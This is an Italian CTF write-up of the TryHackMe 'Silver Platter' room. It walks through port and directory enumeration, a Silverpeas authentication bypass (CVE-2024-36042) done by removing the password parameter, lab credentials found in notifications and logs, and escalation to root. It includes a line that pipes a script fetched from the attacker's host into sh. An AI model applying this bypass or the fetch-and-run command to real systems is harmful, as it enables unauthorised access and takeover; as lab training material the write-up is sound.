
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/silverplatter

Pensi di avere le carte in regola per superare in astuzia il team di Hack Smarter Security? Si vantano di essere imbattibili, e ora è la tua occasione per dimostrare che si sbagliano. Immergiti nel loro server web, trova le bandiere nascoste e mostra al mondo le tue abilità di hacking d'élite. Buona fortuna e che vinca il migliore!  

Ma attenzione, non sarà una passeggiata nel parco digitale. Hack Smarter Security ha rafforzato il server contro gli attacchi più comuni e la sua politica sulle password richiede password che non siano state violate (le confrontano con la lista di parole di rockyou.txt, ecco quanto sono "cool"). La sfida dell'hacking è stata lanciata ed è ora di dare il massimo. Ricorda, solo i più ingegnosi raggiungeranno la vetta. 

Che il tuo codice sia rapido, le tue imprese impeccabili e che la vittoria sia  tua!

```
sudo nmap -Pn -O -v -p- 10.10.196.87
```
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

```
nmap -sVC -p22,80,8080 10.10.196.87
```

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Hack Smarter Security
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Sat, 21 Jun 2025 07:31:01 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|_    Connection: close
|_http-title: Error

```

visitiamo
```
http://10.10.196.87/#contact
```
troviamo
```
If you'd like to get in touch with us, please reach out to our project manager on Silverpeas. His username is "scr1ptkiddy".
```
il nome utente **_"scr1ptkiddy"_** e potremmo contattare il "manager" di **Silverpeas**

Guardiamo cosa c'è sulla porta 8080.
http://10.10.196.87:8080
Non c'è alcuna pagina web predefinita servita sulla porta 8080

vediamo se ci sono delle diectory raggiungibili su porta 80 e 8080
```
gobuster dir -u http://10.10.196.87 -w /usr/share/wordlists/dirb/common.txt -t50
```

```
root@ip-10-10-205-62:~# gobuster dir -u http://10.10.196.87 -w /usr/share/wordlists/dirb/common.txt -t50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.196.87
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 178] [--> http://10.10.196.87/assets/]
/images               (Status: 301) [Size: 178] [--> http://10.10.196.87/images/]
/index.html           (Status: 200) [Size: 14124]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
root@ip-10-10-205-62:~# gobuster dir -u http://10.10.196.87:8080 -w /usr/share/wordlists/dirb/common.txt -t50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.196.87:8080
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/console              (Status: 302) [Size: 0] [--> /noredirect.html]
Progress: 4614 / 4615 (99.98%)
/website              (Status: 302) [Size: 0] [--> http://10.10.196.87:8080/website/]
===============================================================
Finished
===============================================================
root@ip-10-10-205-62:~# 

```

niente di chè sembra che siamo in un vicolo cieco

Cerchiamo informazioni su Silverpeas, scopriamo su internet che è una piattafoema di collaborazione
dopo l'installazione, viene creata una directory chiamata **silverpeas** e le credenziali predefinite sono
**SilverAdmin/SilverAdmin**
proviamo a collegarci su
```
http://10.10.196.87:8080/silverpeas/defaultLogin.jsp
```
troviamo un form di login

- proviamo a loggarci con le credenziali di default SilverAdmin ma nulla di fatto
- proviamo con SQLi ancora con esito negativo
- non proviamo il bruteforce sull'utente scr1ptkiddy inquanto sappiamo che la password non rientra tra i dizionari
- possiamo vedere facendo una ricerca se c'è qualche vulnerabilità su silverpeas

troviamo una vulterabilità di bypass dell'autenticazione
 **[CVE-2024-36042.md](https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d)**

quindi apriamo Burp Suite e catturiamo la richiesta di login
```
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: 10.10.196.87:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://10.10.196.87:8080
Connection: keep-alive
Referer: http://10.10.196.87:8080/silverpeas/defaultLogin.jsp?DomainId=0&ErrorCode=1
Cookie: JSESSIONID=mNY8N-e14Fgc7FYgh__p7K5ORgHb3OkX8eUPUBHS.ebabc79c6d2a
Upgrade-Insecure-Requests: 1
Priority: u=0, i

Login=scr1ptkiddy&Password=12345&DomainId=0
```
rimoviamo il campo Password ed inviamo la richiesta
```
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: 10.10.196.87:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://10.10.196.87:8080
Connection: keep-alive
Referer: http://10.10.196.87:8080/silverpeas/defaultLogin.jsp?DomainId=0&ErrorCode=1
Cookie: JSESSIONID=mNY8N-e14Fgc7FYgh__p7K5ORgHb3OkX8eUPUBHS.ebabc79c6d2a
Upgrade-Insecure-Requests: 1
Priority: u=0, i

Login=scr1ptkiddy&DomainId=0
```
eccoci loggati in
```
http://10.10.196.87:8080/silverpeas/look/jsp/MainFrame.jsp
```

troviamo una notifica non letta da un account Manager 
```
Tyler just asked if I wanted to play VR but he left you out scr1ptkiddy (what a jerk). Want to join us? We will probably hop on in like an hour or so. 
```

proviamo a loggarci come account Manager

```BurpSuite
Login=Manager&DomainId=0
```

troviamo tra le notifiche
```
Administrateur
Notification manuelle
-
Message:

Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes. 

Username: tim

Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```
andiamo a loggarci in ssh!
```
ssh tim@10.10.196.87
```
password
```
cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```
e troviamo la nostra prima flag
```
tim@silver-platter:~$ ls
user.txt
tim@silver-platter:~$ cat user.txt
THM{c4ca4238a0b923820dcc509a6f75849b}
```

```
THM{c4ca4238a0b923820dcc509a6f75849b}
```

possiamo vedere che non abbiamo i permessi di amministratore quindi dobbiamo
effettuare una scalata dei privilegi

```
tim@silver-platter:~$ sudo -l
[sudo] password for tim: 
Sorry, user tim may not run sudo on silver-platter.
tim@silver-platter:~$ cd ..
tim@silver-platter:/home$ 
tim@silver-platter:/home$ ls
tim  tyler
tim@silver-platter:/home$ cd tyler
-bash: cd: tyler: Permission denied
tim@silver-platter:/home$ 
```
abbiamo scoperto l'esistenza di un altro user **tyler** ma non abbiamo i permessi per accederci

Utilizziamo Linpeas

da pc attaccante
```
python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
```

```
chmod +x linpeas.sh
```

dal pc attaccante apriamo un server python
```
sudo python3 -m http.server 8081 #Host
```
dalla vittima  facciamo puntare al nostro IP al tools linpeas
```
curl 10.10.205.62:8081/linpeas.sh | sh 
```
Vediamo che l'utente **_tyler_** è privilegiato, in quanto fa parte del gruppo sudoers, e che anche noi facciamo parte di un gruppo chiamato **adm**

facendo una ricerca su cosa sia il gruppo adm scopriamo che ci permette di leggere in
**/var/logs**

```
cd /var/logs
```
vediamo cosa c'è in questa directory
```
tim@silver-platter:/var/log$ ls -al
total 2144
drwxrwxr-x  11 root      syslog            4096 Jun 21 07:26 .
drwxr-xr-x  14 root      root              4096 Dec 12  2023 ..
-rw-r--r--   1 root      root                 0 May  1  2024 alternatives.log
-rw-r--r--   1 root      root             34877 Dec 12  2023 alternatives.log.1
drwx------   3 root      root              4096 May  8  2024 amazon
drwxr-xr-x   2 root      root              4096 May  1  2024 apt
-rw-r-----   1 syslog    adm               3948 Jun 21 09:58 auth.log
-rw-r-----   1 syslog    adm               6356 Jun 21 07:25 auth.log.1
-rw-r-----   1 syslog    adm              32399 Dec 13  2023 auth.log.2
-rw-r-----   1 syslog    adm                755 May  8  2024 auth.log.2.gz
-rw-r--r--   1 root      root               600 May  8  2024 aws114_ssm_agent_installation.log
-rw-r--r--   1 root      root             64549 Aug 10  2023 bootstrap.log
-rw-rw----   1 root      utmp                 0 Jun 21 07:25 btmp
-rw-rw----   1 root      utmp               384 May  1  2024 btmp.1
-rw-r-----   1 syslog    adm             680197 Jun 21 07:26 cloud-init.log
-rw-r-----   1 root      adm              32825 Jun 21 07:26 cloud-init-output.log
drwxr-xr-x   2 root      root              4096 Aug  2  2023 dist-upgrade
-rw-r-----   1 root      adm              46118 Jun 21 07:26 dmesg
-rw-r-----   1 root      adm              45164 May  8  2024 dmesg.0
-rw-r-----   1 root      adm              14486 May  8  2024 dmesg.1.gz
-rw-r-----   1 root      adm              14519 May  8  2024 dmesg.2.gz
-rw-r-----   1 root      adm              14523 May  1  2024 dmesg.3.gz
-rw-r-----   1 root      adm              14543 Dec 13  2023 dmesg.4.gz
-rw-r--r--   1 root      root                 0 Jun 21 07:25 dpkg.log
-rw-r--r--   1 root      root               490 May  8  2024 dpkg.log.1
-rw-r--r--   1 root      root             50823 Dec 13  2023 dpkg.log.2.gz
-rw-r--r--   1 root      root             32064 Dec 13  2023 faillog
drwxr-x---   4 root      adm               4096 Dec 12  2023 installer
drwxr-sr-x+  3 root      systemd-journal   4096 Dec 12  2023 journal
-rw-r-----   1 syslog    adm               2524 Jun 21 07:26 kern.log
-rw-r-----   1 syslog    adm             185833 Jun 21 07:25 kern.log.1
-rw-r-----   1 syslog    adm              27571 May  8  2024 kern.log.2.gz
-rw-r-----   1 syslog    adm              82570 Dec 13  2023 kern.log.3.gz
drwxr-xr-x   2 landscape landscape         4096 Dec 12  2023 landscape
-rw-rw-r--   1 root      utmp            292584 Jun 21 09:34 lastlog
drwxr-xr-x   2 root      adm               4096 Jun 21 07:25 nginx
drwx------   2 root      root              4096 Aug 10  2023 private
-rw-r-----   1 syslog    adm              76504 Jun 21 09:58 syslog
-rw-r-----   1 syslog    adm             395046 Jun 21 07:25 syslog.1
-rw-r-----   1 syslog    adm              47656 May  8  2024 syslog.2.gz
-rw-r-----   1 syslog    adm             147601 May  1  2024 syslog.3.gz
-rw-r--r--   1 root      root                 0 Aug 10  2023 ubuntu-advantage.log
drwxr-x---   2 root      adm               4096 Jun 21 07:25 unattended-upgrades
-rw-rw-r--   1 root      utmp             25728 Jun 21 09:34 wtmp

```

troviamo interessante il contenuto del file auth.log.2
visto che è abbastanza grande facciamo un tentativo di ricerca mirato alla password
```
cat auth.log.2|grep "PASSWORD"
```
```
tim@silver-platter:/var/log$ cat auth.log.2|grep "PASSWORD"
Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
Dec 13 15:44:30 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database sivlerpeas:silverpeas-6.3.1
Dec 13 15:45:21 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:silverpeas-6.3.1
Dec 13 15:45:57 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:6.3.1
```

troviamo una password di db
```
DB_PASSWORD=_Zd_zx7N823/
```
proviamo a vedere se è utile per autenticarci come utente tyler visto che è presente nei log
```
su tyler
```
password
```
_Zd_zx7N823/
```
ed abbiamo effettuato con successo un movimento laterale
```
tim@silver-platter:/var/log$ su tyler
Password: 
tyler@silver-platter:/var/log$ 
```
facciamo 
```
sudo -l
```
e vediamo che abbiamo tutti i privilegi
```
tyler@silver-platter:/var/log$ sudo -l
[sudo] password for tyler: 
Matching Defaults entries for tyler on silver-platter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User tyler may run the following commands on silver-platter:
    (ALL : ALL) ALL

```
facciamo
```
sudo su
```

```
whoami
```
per vedere che..siamo root!
```
tyler@silver-platter:/var/log$ sudo su
root@silver-platter:/var/log# whoami
root
root@silver-platter:/var/log# 
```
andiamo nella cartella di root
e leggiamo la nostra ultima flag!
```
root@silver-platter:~# ls
root.txt  snap  start_docker_containers.sh
root@silver-platter:~# cat root.txt
THM{xxxxxxxxxxxxxxxx}
```

```
THM{xxxxxxxxxxxxxxxx}
```